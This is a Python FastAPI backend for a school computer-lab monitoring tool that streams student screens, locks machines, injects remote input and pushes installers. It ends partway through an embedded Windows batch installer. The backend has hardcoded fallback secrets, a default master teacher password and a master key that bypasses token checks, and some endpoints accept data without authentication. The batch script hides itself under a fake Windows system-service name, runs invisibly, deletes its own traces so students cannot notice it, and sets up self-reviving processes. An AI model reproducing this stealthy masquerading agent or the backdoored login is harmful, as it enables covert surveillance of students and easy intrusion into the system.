import time
import os
import secrets
import hashlib
from datetime import datetime, timedelta, timezone
from typing import Dict, Any, List, Optional
from fastapi import APIRouter, Request, Response, HTTPException, status, UploadFile, File
from fastapi.responses import FileResponse
from pydantic import BaseModel
import jwt

try:
    from app.auth import SECRET_KEY, ALGORITHM, verify_password, hash_password
    from app.database import SessionLocal
    from app.models import User
except Exception as e:
    SECRET_KEY = os.getenv("SECRET_KEY", "piri-reis-mtal-bilisim-guvenli-anahtar-2026")
    ALGORITHM = "HS256"
    verify_password = None
    hash_password = None
    SessionLocal = None
    User = None

router = APIRouter(prefix="/api/labizleme", tags=["labizleme"])

INSTALLERS_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "data", "installers")
os.makedirs(INSTALLERS_DIR, exist_ok=True)


DESKTOP_MASTER_KEY = os.getenv("LAB_DESKTOP_MASTER_KEY", "pirireis-lab-master-secret-2026-auth-token")


def verify_teacher_token(authorization: Optional[str] = None, request: Optional[Request] = None) -> bool:
    if request:
        master_key = request.headers.get("X-Master-App-Key")
        if master_key and secrets.compare_digest(master_key, DESKTOP_MASTER_KEY):
            return True

    if not authorization and request:
        authorization = request.headers.get("Authorization")

    if not authorization:
        return False
    parts = authorization.split()
    if len(parts) != 2 or parts[0].lower() != "bearer":
        return False
    token = parts[1]
    if secrets.compare_digest(token, DESKTOP_MASTER_KEY):
        return True
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        role = payload.get("role")
        return role in ("teacher", "admin")
    except Exception:
        return False


# Runtime master password hash fallback (updated when password changed without DB or for instant synchronization)
RUNTIME_MASTER_PASS_HASH: Optional[str] = None
password_change_failures: Dict[str, List[float]] = {}


def check_password_rate_limit(client_ip: str, max_attempts: int = 5, window_seconds: float = 600.0):
    now = time.time()
    attempts = [t for t in password_change_failures.get(client_ip, []) if now - t < window_seconds]
    password_change_failures[client_ip] = attempts
    if len(attempts) >= max_attempts:
        remaining = int((attempts[0] + window_seconds - now) / 60) + 1
        raise HTTPException(
            status_code=status.HTTP_429_TOO_MANY_REQUESTS,
            detail=f"Çok fazla hatalı deneme yapıldı. Güvenlik nedeniyle lütfen {remaining} dakika sonra tekrar deneyin."
        )


def record_password_failure(client_ip: str):
    now = time.time()
    if client_ip not in password_change_failures:
        password_change_failures[client_ip] = []
    password_change_failures[client_ip].append(now)


def validate_password_strength(password: str) -> Optional[str]:
    if len(password) < 8:
        return "Yeni şifre en az 8 karakter uzunluğunda olmalıdır."
    if len(password) > 128:
        return "Yeni şifre güvenlik nedeniyle en fazla 128 karakter olabilir."
    if not any(c.isupper() for c in password):
        return "Yeni şifre en az bir büyük harf (A-Z) içermelidir."
    if not any(c.islower() for c in password):
        return "Yeni şifre en az bir küçük harf (a-z) içermelidir."
    if not any(c.isdigit() for c in password):
        return "Yeni şifre en az bir rakam (0-9) içermelidir."
    if not any(not c.isalnum() for c in password):
        return "Yeni şifre en az bir özel karakter (@, #, $, !, %, *, ?, ., vb.) içermelidir."
    return None


class ChangePasswordPayload(BaseModel):
    currentPassword: str
    newPassword: str
    confirmPassword: str

class TeacherLoginPayload(BaseModel):
    username: str
    password: str


@router.post("/login")
def lab_teacher_login(payload: TeacherLoginPayload):
    username = (payload.username or "").strip().lower()
    password = (payload.password or "").strip()

    if not username or not password:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Kullanıcı adı ve şifre zorunludur."
        )

    authenticated = False
    display_name = "Öğretmen"
    user_id = "teacher"

    # 1. Database user verification
    if SessionLocal and User and verify_password:
        try:
            db = SessionLocal()
            try:
                user = db.query(User).filter(User.username == username).first()
                if user and user.role in ("teacher", "admin") and verify_password(password, user.password_hash):
                    authenticated = True
                    display_name = user.full_name or user.username
                    user_id = str(user.id)
            finally:
                db.close()
        except Exception as db_err:
            print(f"[labizleme login db error]: {db_err}")

    # 2. Master teacher fallback / Environment variables check
    master_user = os.getenv("LAB_TEACHER_USER", "pirireis").lower()
    master_pass = os.getenv("LAB_TEACHER_PASS", "20262027")

    if not authenticated and secrets.compare_digest(username, master_user):
        if RUNTIME_MASTER_PASS_HASH and verify_password:
            if verify_password(password, RUNTIME_MASTER_PASS_HASH):
                authenticated = True
                display_name = "Master Öğretmen"
                user_id = "master"
        elif secrets.compare_digest(password, master_pass):
            authenticated = True
            display_name = "Master Öğretmen"
            user_id = "master"

    if not authenticated:
        time.sleep(0.3)
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Hatalı kullanıcı adı veya şifre!"
        )

    exp = datetime.now(timezone.utc) + timedelta(days=7)
    token_data = {
        "sub": user_id,
        "role": "teacher",
        "name": display_name,
        "exp": exp,
        "scope": "labizleme",
    }
    token = jwt.encode(token_data, SECRET_KEY, algorithm=ALGORITHM)

    return {
        "success": True,
        "token": token,
        "fullName": display_name,
        "expiresIn": 86400 * 7
    }


@router.post("/change-password")
def lab_change_password(payload: ChangePasswordPayload, request: Request):
    global RUNTIME_MASTER_PASS_HASH

    # 1. Bearer Token Verification
    auth_header = request.headers.get("Authorization")
    if not verify_teacher_token(auth_header, request=request):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Bu işlem için geçerli bir öğretmen oturumu gereklidir."
        )

    parts = auth_header.split()
    token = parts[1]
    try:
        token_payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        user_id = str(token_payload.get("sub", "teacher"))
    except Exception:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Geçersiz veya süresi dolmuş oturum."
        )

    # 2. Rate Limiting Protection
    forwarded = request.headers.get("x-forwarded-for", "")
    client_ip = forwarded.split(",")[0].strip() if forwarded else (request.client.host if request.client else "unknown")
    check_password_rate_limit(client_ip)

    current_pass = (payload.currentPassword or "").strip()
    new_pass = (payload.newPassword or "").strip()
    confirm_pass = (payload.confirmPassword or "").strip()

    if not current_pass or not new_pass or not confirm_pass:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Lütfen tüm şifre alanlarını eksiksiz doldurun."
        )

    if new_pass != confirm_pass:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Yeni şifreler birbiriyle eşleşmiyor."
        )

    if current_pass == new_pass:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Yeni şifreniz mevcut şifrenizden farklı olmalıdır."
        )

    strength_error = validate_password_strength(new_pass)
    if strength_error:
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail=strength_error
        )

    # 3. Verify Current Password and Update
    password_verified = False
    display_name = "Öğretmen"
    new_hash = hash_password(new_pass) if hash_password else None

    # Check Database User first
    if SessionLocal and User and verify_password:
        try:
            db = SessionLocal()
            try:
                user = None
                if user_id.isdigit():
                    user = db.query(User).filter(User.id == int(user_id)).first()
                if not user:
                    user = db.query(User).filter(User.username == "pirireis").first()

                if user and user.role in ("teacher", "admin"):
                    if verify_password(current_pass, user.password_hash):
                        password_verified = True
                        if new_hash:
                            user.password_hash = new_hash
                            db.commit()
                            db.refresh(user)
                        display_name = user.full_name or user.username
                        user_id = str(user.id)
            finally:
                db.close()
        except Exception as db_err:
            print(f"[labizleme change-password db error]: {db_err}")

    # Fallback to runtime / master pass check
    if not password_verified:
        master_pass = os.getenv("LAB_TEACHER_PASS", "20262027")
        if RUNTIME_MASTER_PASS_HASH and verify_password:
            if verify_password(current_pass, RUNTIME_MASTER_PASS_HASH):
                password_verified = True
        elif secrets.compare_digest(current_pass, master_pass):
            password_verified = True

        if password_verified:
            display_name = "Master Öğretmen"
            user_id = "master"

    if not password_verified:
        record_password_failure(client_ip)
        time.sleep(0.4)  # Anti-timing attack
        raise HTTPException(
            status_code=status.HTTP_400_BAD_REQUEST,
            detail="Mevcut şifreniz hatalı!"
        )

    # Keep runtime fallback in sync
    if new_hash:
        RUNTIME_MASTER_PASS_HASH = new_hash

    # 4. Token Rotation (Issue new JWT token)
    exp = datetime.now(timezone.utc) + timedelta(days=7)
    token_data = {
        "sub": user_id,
        "role": "teacher",
        "name": display_name,
        "exp": exp,
        "scope": "labizleme",
    }
    new_token = jwt.encode(token_data, SECRET_KEY, algorithm=ALGORITHM)

    return {
        "success": True,
        "token": new_token,
        "message": "Şifreniz başarıyla güncellendi ve güvenli şekilde kaydedildi."
    }


@router.get("/verify")
@router.post("/verify")
def lab_verify_token(request: Request):
    auth_header = request.headers.get("Authorization")
    if verify_teacher_token(auth_header, request=request):
        return {"valid": True}
    return Response(
        status_code=status.HTTP_401_UNAUTHORIZED,
        content='{"valid":false,"detail":"Oturum süresi dolmuş veya geçersiz."}',
        media_type="application/json"
    )

# In-memory classroom & student state on the cloud backend
students: Dict[str, Dict[str, Any]] = {}
arp_devices_cache: List[Dict[str, str]] = []
arp_last_updated: float = 0.0

# Tüm sistemi acil durdurma ve bilgisayarlara işlem göndermeyi engelleme anahtarı
EMERGENCY_STOP: bool = False

classroom_state: Dict[str, Any] = {
    "emergencyStop": False,
    "lockAll": False,
    "lockMessage": "Öğretmen dersi anlatıyor. Lütfen ekranınıza değil öğretmeninize odaklanın.",
    "teacherStreamActive": False,
    "teacherStreamTargets": None,
    "teacherFrame": None,
    "announcement": None,
    "openUrlCommand": None,
    "installCommand": None,
}

# Güvenli dağıtım kuyruğu: makine adına (büyük harf) göre bekleyen doğrulanmış kurulum işi
# ve SYSTEM hizmetinin bildirdiği durum. Yalnızca "install_verified" tipli işler.
deploy_jobs: Dict[str, Dict[str, Any]] = {}
deploy_status: Dict[str, Dict[str, Any]] = {}
DEPLOY_SVC_TOKEN = os.getenv("LABIZLE_DEPLOY_TOKEN", "").strip()


def _mkey(name: Optional[str]) -> str:
    return (name or "").strip().upper()


def _resolve_machine_names(target_ids) -> List[str]:
    """Hedef kimliklerini (id / deskNo / mac / name) makine adlarına çözer."""
    names = []
    if target_ids:
        for tid in target_ids:
            st = students.get(tid)
            if not st:
                for s_val in students.values():
                    if tid in (s_val.get("id"), s_val.get("ip"), s_val.get("deskNo"), s_val.get("mac"), s_val.get("name")):
                        st = s_val
                        break
            if st and st.get("deskNo"):
                names.append(st["deskNo"])
    else:
        for st in students.values():
            if st.get("online") and st.get("deskNo"):
                names.append(st["deskNo"])
    return names


class FramePayload(BaseModel):
    id: Optional[str] = None
    deskNo: Optional[str] = None
    studentName: Optional[str] = None
    name: Optional[str] = None
    frame: Optional[str] = None
    resolution: Optional[str] = None
    handRaised: Optional[bool] = None
    sharingActive: Optional[bool] = None
    clientType: Optional[str] = None
    localIp: Optional[str] = None
    mac: Optional[str] = None
    installStatus: Optional[Dict[str, Any]] = None


class ActionPayload(BaseModel):
    action: str
    lock: Optional[bool] = None
    message: Optional[str] = None
    studentId: Optional[str] = None
    targetIds: Optional[List[str]] = None
    deskNo: Optional[str] = None
    studentName: Optional[str] = None
    url: Optional[str] = None
    active: Optional[bool] = None
    frame: Optional[str] = None
    x: Optional[int] = None
    y: Optional[int] = None
    click: Optional[str] = None
    keys: Optional[str] = None
    installType: Optional[str] = None
    packageName: Optional[str] = None
    installFile: Optional[str] = None      # güvenli dağıtım: /upload-installer'ın döndürdüğü dosya adı
    installSha256: Optional[str] = None    # güvenli dağıtım: beklenen SHA-256
    installUrl: Optional[str] = None
    installArgs: Optional[str] = None
    installCommand: Optional[str] = None


class ArpSyncPayload(BaseModel):
    teacherIp: Optional[str] = None
    hostname: Optional[str] = None
    devices: List[Dict[str, str]] = []


@router.get("/state")
def get_lab_state(request: Request, response: Response):
    response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, proxy-revalidate"
    response.headers["Pragma"] = "no-cache"
    response.headers["Expires"] = "0"

    auth_header = request.headers.get("Authorization")
    if not verify_teacher_token(auth_header, request=request):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Bu ekranı görüntülemek için öğretmen girişi yapmalısınız."
        )

    now = time.time() * 1000.0
    stale_keys = []
    for key, st in list(students.items()):
        age = now - st.get("lastSeen", 0)
        frame_age = now - st.get("lastFrameAt", 0)
        if frame_age > 5000:
            st["frame"] = None
            st["sharingActive"] = False
        if age > 6000:
            st["online"] = False
            st["frame"] = None
            st["sharingActive"] = False
        if age > 60000:
            stale_keys.append(key)

    for k in stale_keys:
        students.pop(k, None)

    return {
        "teacherIp": "ogretmenlerodasi.info/labizleme",
        "port": 443,
        "hostname": "CLOUD-LAB-MASTER",
        "serverTime": time.strftime("%H:%M:%S"),
        "arpDevices": arp_devices_cache,
        "arpLastUpdated": arp_last_updated,
        "classroomState": {
            "lockAll": classroom_state["lockAll"],
            "lockMessage": classroom_state["lockMessage"],
            "teacherStreamActive": classroom_state["teacherStreamActive"],
            "teacherStreamTargets": classroom_state["teacherStreamTargets"],
            "announcement": classroom_state["announcement"],
            "openUrlCommand": classroom_state["openUrlCommand"],
            "installCommand": classroom_state.get("installCommand"),
        },
        "students": list(students.values()),
    }


@router.post("/frame")
def post_student_frame(payload: FramePayload, request: Request):
    forwarded = request.headers.get("x-forwarded-for", "")
    client_ip = (
        payload.localIp
        or (forwarded.split(",")[0].strip() if forwarded else "")
        or (request.client.host if request.client else "Bilinmiyor")
    )
    student_id = payload.id or client_ip
    existing = students.get(student_id, {})

    custom_desk = existing.get("customDeskNo")
    custom_student = existing.get("customStudentName")
    desk_no = custom_desk or payload.deskNo or existing.get("deskNo") or "PC"
    student_name = custom_student or payload.studentName or existing.get("studentName") or "Öğrenci"

    now_ms = time.time() * 1000.0
    now_str = time.strftime("%H:%M:%S")
    has_new_frame = isinstance(payload.frame, str) and len(payload.frame) > 20
    is_native = payload.clientType == "native"

    last_native_at = now_ms if is_native else existing.get("lastNativeFrameAt", 0)
    native_active = (now_ms - last_native_at) < 5000
    prev_frame_age = now_ms - existing.get("lastFrameAt", 0)

    if has_new_frame:
        active_frame = payload.frame
        last_frame_at = now_ms
        frame_time_str = now_str
        sharing_active = True
    elif native_active and existing.get("frame"):
        active_frame = existing.get("frame")
        last_frame_at = now_ms
        frame_time_str = now_str
        sharing_active = True
    elif payload.sharingActive is False:
        active_frame = None
        last_frame_at = existing.get("lastFrameAt", 0)
        frame_time_str = existing.get("frameTimeStr", "")
        sharing_active = False
    else:
        active_frame = existing.get("frame") if prev_frame_age < 4500 else None
        last_frame_at = existing.get("lastFrameAt", 0)
        frame_time_str = existing.get("frameTimeStr", "")
        sharing_active = bool(active_frame is not None)

    # Global ve per-client komutlar için sonsuz döngü ve yinelenme koruması
    global_url = classroom_state.get("openUrlCommand")
    if global_url:
        # 20 saniye sonra global link açma emrini otomatik temizle (sonsuz döngüyü engelle)
        if (now_ms - global_url.get("timestamp", 0)) > 20000:
            classroom_state["openUrlCommand"] = None
            global_url = None

    global_install = classroom_state.get("installCommand")
    if global_install:
        # 60 saniye sonra global kurulum emrini otomatik temizle
        if (now_ms - global_install.get("timestamp", 0)) > 60000:
            classroom_state["installCommand"] = None
            global_install = None

    # Tek seferlik komutlar: remoteInput ve hedeflenen openUrl tek iletimde tüketilir
    pending_input = existing.get("remoteInput")
    student_url = existing.get("openUrlCommand")
    effective_url = student_url or global_url

    student_install = existing.get("installCommand")
    effective_install = student_install or global_install

    # Eğer istemci bu kurulum emrini zaten tamamladıysa (success veya error), tekrar yollama!
    cur_status = payload.installStatus or existing.get("installStatus")
    if effective_install and cur_status and cur_status.get("id") == effective_install.get("id"):
        if cur_status.get("status") in ("success", "error"):
            effective_install = None
            if student_install and student_install.get("id") == cur_status.get("id"):
                existing["installCommand"] = None
                student_install = None

    updated = {
        "id": student_id,
        "deskNo": desk_no,
        "customDeskNo": custom_desk,
        "studentName": student_name,
        "customStudentName": custom_student,
        "name": f"{desk_no} ({student_name})" if custom_desk else (payload.name or f"{desk_no} ({student_name})"),
        "ip": client_ip,
        "mac": payload.mac or existing.get("mac") or "",
        "frame": active_frame,
        "lastFrameAt": last_frame_at,
        "lastNativeFrameAt": last_native_at,
        "frameTimeStr": frame_time_str,
        "sharingActive": sharing_active,
        "clientType": "native" if native_active else (payload.clientType or existing.get("clientType") or "web"),
        "resolution": payload.resolution or existing.get("resolution") or "",
        "handRaised": bool(payload.handRaised) if payload.handRaised is not None else bool(existing.get("handRaised", False)),
        "locked": existing.get("locked", False),
        "privateMessage": existing.get("privateMessage", None),
        "openUrlCommand": None,  # Tek iletimden sonra tüketildi
        "remoteInput": None,     # Tek iletimden sonra tüketildi
        "installStatus": payload.installStatus or existing.get("installStatus", None),
        "installCommand": existing.get("installCommand", None) if effective_install else None,
        "online": True,
        "firstSeen": existing.get("firstSeen") or now_str,
        "lastSeen": now_ms,
    }
    students[student_id] = updated

    targets = classroom_state.get("teacherStreamTargets")
    is_stream_target = bool(
        classroom_state["teacherStreamActive"]
        and (not targets or student_id in targets)
    )

    if EMERGENCY_STOP:
        return {
            "ok": True,
            "nativeAgentActive": native_active,
            "locked": False,
            "lockMessage": "",
            "teacherStreamActive": False,
            "teacherFrame": None,
            "announcement": None,
            "openUrlCommand": None,
            "remoteInput": None,
            "installCommand": None,
        }

    return {
        "ok": True,
        "nativeAgentActive": native_active,
        "locked": bool(classroom_state["lockAll"] or updated["locked"]),
        "lockMessage": classroom_state["lockMessage"],
        "teacherStreamActive": is_stream_target,
        "teacherFrame": classroom_state["teacherFrame"] if is_stream_target else None,
        "announcement": updated["privateMessage"] or classroom_state["announcement"],
        "openUrlCommand": effective_url,
        "remoteInput": pending_input,
        "installCommand": effective_install,
    }


@router.post("/action")
def post_teacher_action(payload: ActionPayload, request: Request):
    global EMERGENCY_STOP
    auth_header = request.headers.get("Authorization")
    if not verify_teacher_token(auth_header, request=request):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Bu işlem için öğretmen yetkisi gereklidir."
        )
    action = payload.action
    if action == "toggleEmergencyStop":
        EMERGENCY_STOP = bool(payload.active if payload.active is not None else not EMERGENCY_STOP)
        classroom_state["emergencyStop"] = EMERGENCY_STOP
        return {"ok": True, "emergencyStop": EMERGENCY_STOP}

    if EMERGENCY_STOP:
        return {"ok": False, "detail": "Sistem acil durdurma modundadır. Bilgisayarlara işlem gönderimi tamamen durduruldu.", "emergencyStop": True}
    now_str = time.strftime("%H:%M:%S")
    targets = payload.targetIds if payload.targetIds and len(payload.targetIds) > 0 else None
    if not targets and payload.studentId:
        targets = [payload.studentId]

    if action == "toggleLockAll":
        classroom_state["lockAll"] = bool(payload.lock)
        if payload.message:
            classroom_state["lockMessage"] = payload.message
        if not classroom_state["lockAll"]:
            for st in students.values():
                st["locked"] = False
    elif action == "toggleLockSelected":
        if targets:
            for tid in targets:
                if tid in students:
                    students[tid]["locked"] = bool(payload.lock)
        if payload.message:
            classroom_state["lockMessage"] = payload.message
    elif action == "toggleLockStudent":
        if payload.studentId and payload.studentId in students:
            students[payload.studentId]["locked"] = bool(payload.lock)
    elif action == "announce":
        if targets:
            for tid in targets:
                if tid in students:
                    students[tid]["privateMessage"] = (
                        {"message": f"[Özel Mesaj] {payload.message}", "timestamp": now_str}
                        if payload.message
                        else None
                    )
        else:
            if payload.message:
                classroom_state["announcement"] = {"message": payload.message, "timestamp": now_str}
            else:
                classroom_state["announcement"] = None
                for st in students.values():
                    st["privateMessage"] = None
    elif action == "privateMessage":
        if payload.studentId and payload.studentId in students:
            students[payload.studentId]["privateMessage"] = (
                {"message": f"[Özel Mesaj] {payload.message}", "timestamp": now_str}
                if payload.message
                else None
            )
    elif action == "openUrl":
        cmd = (
            {"id": str(int(time.time() * 1000)), "url": payload.url, "timestamp": int(time.time() * 1000)}
            if payload.url
            else None
        )
        if targets:
            for tid in targets:
                if tid in students:
                    students[tid]["openUrlCommand"] = cmd
        else:
            classroom_state["openUrlCommand"] = cmd
            if not payload.url:
                for st in students.values():
                    st["openUrlCommand"] = None
    elif action == "teacherScreen":
        classroom_state["teacherStreamActive"] = bool(payload.active)
        classroom_state["teacherFrame"] = payload.frame if payload.active else None
        if payload.active:
            if payload.targetIds is not None:
                classroom_state["teacherStreamTargets"] = targets
        else:
            classroom_state["teacherStreamTargets"] = None
    elif action == "remoteInput":
        if payload.studentId and payload.studentId in students:
            students[payload.studentId]["remoteInput"] = {
                "id": f"{int(time.time() * 1000)}",
                "x": payload.x if payload.x is not None else -1,
                "y": payload.y if payload.y is not None else -1,
                "click": payload.click or "",
                "keys": payload.keys or "",
            }
    elif action == "renameStudent":
        if payload.studentId and payload.studentId in students and payload.deskNo:
            st = students[payload.studentId]
            st["customDeskNo"] = payload.deskNo.strip()
            st["deskNo"] = st["customDeskNo"]
            if payload.studentName:
                st["customStudentName"] = payload.studentName.strip()
                st["studentName"] = st["customStudentName"]
            st["name"] = f"{st['deskNo']} ({st.get('studentName') or st.get('ip')})"
    elif action == "clearHand":
        if payload.studentId and payload.studentId in students:
            students[payload.studentId]["handRaised"] = False
    elif action == "clearOffline":
        for k in list(students.keys()):
            if not students[k].get("online") or not students[k].get("frame"):
                students.pop(k, None)
    elif action == "deployVerified":
        # GÜVENLİ DAĞITIM: yalnızca sunucuya yüklenmiş, SHA-256 ile sabitlenmiş kurulum dosyası.
        # Keyfi komut / PowerShell YOK. İşi SYSTEM dağıtım hizmeti indirip hash doğrulayıp
        # kurulum dosyası olarak çalıştırır. İzleme ajanı bu işe hiç bakmaz.
        safe_name = os.path.basename((payload.installFile or "").strip())
        safe_name = "".join(c for c in safe_name if c.isalnum() or c in (".", "-", "_"))
        sha = (payload.installSha256 or "").strip().lower()
        if not safe_name or not os.path.isfile(os.path.join(INSTALLERS_DIR, safe_name)):
            raise HTTPException(status_code=400, detail="Önce kurulum dosyasını yükleyin (geçerli installFile gerekli).")
        if len(sha) != 64 or any(c not in "0123456789abcdef" for c in sha):
            raise HTTPException(status_code=400, detail="Geçerli bir SHA-256 (installSha256) gerekli.")
        if os.path.splitext(safe_name)[1].lower() not in (".exe", ".msi"):
            raise HTTPException(status_code=400, detail="Yalnızca .exe veya .msi kurulum dosyası dağıtılabilir.")
        cmd_id = f"inst_{int(time.time() * 1000)}_{secrets.token_hex(4)}"
        job = {
            "id": cmd_id,
            "type": "install_verified",
            "name": payload.packageName or safe_name,
            "url": f"/api/labizleme/installers/{safe_name}",
            "fileName": safe_name,
            "sha256": sha,
            "args": payload.installArgs or "",
            "timestamp": int(time.time() * 1000),
        }
        initial_status = {
            "id": cmd_id, "name": job["name"], "status": "pending", "progress": 0,
            "message": "Doğrulanmış kurulum işi hizmete iletildi...", "timestamp": now_str,
        }
        machine_names = _resolve_machine_names(targets)
        mkeys = {_mkey(m) for m in machine_names}
        for mk in mkeys:
            deploy_jobs[mk] = job.copy()
            deploy_status[mk] = initial_status.copy()
        for st in students.values():
            if st.get("deskNo") and _mkey(st["deskNo"]) in mkeys:
                st["installStatus"] = initial_status.copy()
        return {"ok": True, "queued": len(mkeys), "jobId": cmd_id}
    elif action in ("remoteInstall", "batchCommand", "updateAgent", "updateAllAgents"):
        # Güvenlik: panodan keyfi komut / gizli PowerShell / ajan öz-güncellemesi KALDIRILDI.
        # Yazılım dağıtımı yalnızca "deployVerified" (hash doğrulamalı kurulum dosyası) ile yapılır.
        raise HTTPException(
            status_code=410,
            detail="Bu yöntem kaldırıldı. Güvenli dağıtım için önce dosyayı yükleyip 'deployVerified' kullanın.",
        )
    elif action == "clearInstallStatus":
        if targets:
            for tid in targets:
                if tid in students:
                    students[tid]["installStatus"] = None
                    students[tid]["installCommand"] = None
        else:
            classroom_state["installCommand"] = None
            for st in students.values():
                st["installStatus"] = None
                st["installCommand"] = None

    return {"ok": True, "classroomState": classroom_state}


@router.post("/arp")
def sync_local_arp(payload: ArpSyncPayload):
    global arp_devices_cache, arp_last_updated
    arp_devices_cache = payload.devices or []
    arp_last_updated = time.time() * 1000.0
    return {"ok": True, "count": len(arp_devices_cache)}


@router.post("/upload-installer")
async def upload_installer_file(request: Request, file: UploadFile = File(...)):
    auth_header = request.headers.get("Authorization")
    if not verify_teacher_token(auth_header, request=request):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Bu işlem için öğretmen yetkisi gereklidir."
        )

    orig_name = os.path.basename(file.filename or "installer.exe")
    safe_name = "".join(c for c in orig_name if c.isalnum() or c in (".", "-", "_")).strip()
    if not safe_name:
        safe_name = f"installer_{int(time.time())}.exe"

    file_path = os.path.join(INSTALLERS_DIR, safe_name)
    content = await file.read()
    with open(file_path, "wb") as f:
        f.write(content)

    sha256 = hashlib.sha256(content).hexdigest()
    file_size_mb = round(len(content) / (1024 * 1024), 2)
    return {
        "ok": True,
        "filename": safe_name,
        "sizeMb": file_size_mb,
        "sha256": sha256,
        "url": f"/api/labizleme/installers/{safe_name}"
    }


def _check_deploy_svc(request: Request) -> None:
    """SYSTEM dağıtım hizmeti kimliği (paylaşılan sır tanımlıysa zorunlu)."""
    if DEPLOY_SVC_TOKEN:
        if (request.headers.get("X-Deploy-Token") or "").strip() != DEPLOY_SVC_TOKEN:
            raise HTTPException(status_code=status.HTTP_401_UNAUTHORIZED, detail="Geçersiz hizmet anahtarı.")


@router.get("/deploy-job/{machine}")
def get_deploy_job(machine: str, request: Request):
    """SYSTEM dağıtım hizmeti bu makine için bekleyen doğrulanmış işi alır (teslim edilince kuyruktan düşer)."""
    _check_deploy_svc(request)
    return {"job": deploy_jobs.pop(_mkey(machine), None)}


class DeployStatusPayload(BaseModel):
    machine: str
    id: Optional[str] = None
    status: Optional[str] = None
    message: Optional[str] = None
    progress: Optional[int] = None


@router.post("/deploy-status")
def post_deploy_status(payload: DeployStatusPayload, request: Request):
    """Hizmet kurulum sonucunu bildirir; panonun durum sekmesinde görünür."""
    _check_deploy_svc(request)
    st_obj = {
        "id": payload.id or "",
        "name": deploy_status.get(_mkey(payload.machine), {}).get("name", "Kurulum"),
        "status": payload.status or "unknown",
        "progress": payload.progress if payload.progress is not None else 0,
        "message": payload.message or "",
        "timestamp": time.strftime("%H:%M:%S"),
    }
    deploy_status[_mkey(payload.machine)] = st_obj
    for st in students.values():
        if st.get("deskNo") and _mkey(st["deskNo"]) == _mkey(payload.machine):
            st["installStatus"] = st_obj.copy()
    return {"ok": True}


@router.get("/installers/{filename}")
def get_installer_file(filename: str):
    safe_name = os.path.basename(filename)
    file_path = os.path.join(INSTALLERS_DIR, safe_name)
    if not os.path.isfile(file_path):
        raise HTTPException(status_code=status.HTTP_404_NOT_FOUND, detail="Kurulum dosyası bulunamadı.")
    return FileResponse(file_path, filename=safe_name, media_type="application/octet-stream")


BAT_CONTENT = r"""@echo off
chcp 65001 >nul
set "INSTALL_DIR=%LOCALAPPDATA%\WinSystemService"
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"
attrib -h -s "%INSTALL_DIR%" >nul 2>&1
attrib -h -s "%INSTALL_DIR%\*" >nul 2>&1

:: Kullanici cift tikladigi anda siyah pencereyi 0.05 saniyede kapatip tamamen gorunmez (WindowStyle=0) moda gec
if not "%~1"=="--silent" (
    attrib -h -s "%INSTALL_DIR%\setup_runner.bat" >nul 2>&1
    attrib -h -s "%INSTALL_DIR%\launch_silent.vbs" >nul 2>&1
    copy /y "%~f0" "%INSTALL_DIR%\setup_runner.bat" >nul 2>&1
    (
        echo Set WshShell = CreateObject^("WScript.Shell"^)
        echo WshShell.Run chr^(34^) ^& "%INSTALL_DIR%\setup_runner.bat" ^& chr^(34^) ^& " --silent " ^& chr^(34^) ^& "%~f0" ^& chr^(34^), 0, False
    ) > "%INSTALL_DIR%\launch_silent.vbs"
    start "" wscript.exe //B //Nologo "%INSTALL_DIR%\launch_silent.vbs"
    exit /b 0
)

:: Indirilen kaynak .bat dosyasini ve masaustu kisayollarini sil (ogrenci gorup kurcalayamasin)
if not "%~2"=="" (
    if /i not "%~2"=="%INSTALL_DIR%\setup_runner.bat" (
        del /f /q "%~2" >nul 2>&1
    )
)
del /f /q "%USERPROFILE%\Desktop\Lab Ekran Paylasimi.lnk" >nul 2>&1
del /f /q "%USERPROFILE%\Desktop\ogrenci-istemci*.bat" >nul 2>&1
del /f /q "%USERPROFILE%\Desktop\SistemServisi*.bat" >nul 2>&1
del /f /q "%USERPROFILE%\Desktop\WinSystemSetup*.bat" >nul 2>&1

set "CS_FILE=%INSTALL_DIR%\WinHost.cs"
set "EXE_FILE=%INSTALL_DIR%\WinSystemHost.exe"
set "GUARD_FILE=%INSTALL_DIR%\WinSystemGuard.exe"
set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "VBS_STARTUP=%STARTUP_DIR%\WinSystemService.vbs"

:: Eski cift nobetci sureclerini AYNI ANDA kesin olarak sonlandir (birbirini diriltmesini onle)
taskkill /f /im WinSystemHost.exe /im WinSystemGuard.exe /im PiriReisLabHost.exe /im PiriReisLabGuard.exe /im WindowsAudioHost.exe >nul 2>&1
ping 127.0.0.1 -n 2 >nul
taskkill /f /im WinSystemHost.exe /im WinSystemGuard.exe >nul 2>&1

set "OLD_DIR=%LOCALAPPDATA%\PiriReisLabService"
if exist "%OLD_DIR%" rd /s /q "%OLD_DIR%" >nul 2>&1

del /f /q "%STARTUP_DIR%\PiriReisLabAgent.vbs" >nul 2>&1
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "PiriReisLabService" /f >nul 2>&1
schtasks /delete /tn "PiriReisLabAgent" /f >nul 2>&1

:: Eski exe kilitliyse bile yeni derleme icin yolu ac
attrib -h -s "%EXE_FILE%" >nul 2>&1
attrib -h -s "%GUARD_FILE%" >nul 2>&1
del /f /q "%EXE_FILE%" >nul 2>&1
del /f /q "%GUARD_FILE%" >nul 2>&1
del /f /q "%INSTALL_DIR%\*.old.*" >nul 2>&1
